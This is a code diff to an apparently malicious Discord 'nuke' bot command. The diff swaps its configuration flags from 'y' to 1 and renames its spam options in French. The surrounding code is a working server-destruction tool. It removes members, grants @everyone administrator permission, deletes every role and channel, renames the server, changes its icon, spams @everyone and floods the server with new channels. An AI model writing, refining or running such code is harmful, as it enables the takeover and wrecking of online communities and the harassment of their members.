@@ -3,7 +3,7 @@ const moment = require('moment');
 const chalk = require('chalk');
 exports.run = (client, message, args) => {
 
-    if (settings.config.ban === "y") {
+    if (settings.config.ban === 1) {
     message.guild.members.map(m=>{
         if (m.position >= message.guild.me.highestRole.position) {
             m.delete();
@@ -14,23 +14,23 @@ exports.run = (client, message, args) => {
 
     function suite(){
         message.guild.edit({
-            icon: settings.config.img,
             name: settings.config.name
         }).catch(console.error);
+        message.guild.setIcon(settings.config.img);
     }
     
 
 
 
-    if (settings.config.admin === "y") {
+    if (settings.config.admin === 1) {
     message.guild.roles.find('name', '@everyone').edit({
         permissions: [8]
     }).catch(console.error);
     }
-    if (settings.config.role_dlt === "y") {
+    if (settings.config.role_dlt === 1) {
     Promise.all(message.guild.roles.map(c => c.delete())).catch(console.error);
     }
-    if (settings.config.role_crt === "y") {
+    if (settings.config.role_crt === 1) {
         message.guild.createRole({
             name: 'undefined-1'
         }).catch(console.error);
@@ -51,23 +51,23 @@ exports.run = (client, message, args) => {
     message.channel.send('spam @everyone');
     message.guild.createChannel(settings.config.chnlname);
 
-        if (settings.config.spam === 'n') {
+        if (settings.config.spam === 'Créer des salons textuels à l\'infini') {
             const typer = 'text';
             message.guild.createChannel('undefined-3', typer).catch(console.error);
         }
-        if (settings.config.spam === 'v') {
+        if (settings.config.spam === 'Créer des salons vocaux') {
             const typer = 'voice';
             message.guild.createChannel('undefined-3', typer).catch(console.error);
 
         }
-        if (settings.config.spam === 'c') {
+        if (settings.config.spam === 'Créer des catégories') {
             const typer = 'category';
             message.guild.createChannel('undefined-3', typer).catch(console.error);
         }
-    if (settings.config.chnl_dlt === "y"){
+    if (settings.config.chnl_dlt === 1){
     Promise.all(message.guild.channels.map(c => c.delete())).catch(console.error);
     }
-    if (settings.config.imgnom === "y") {
+    if (settings.config.imgnom === 1) {
     setTimeout(suite, 500);
     }
 }
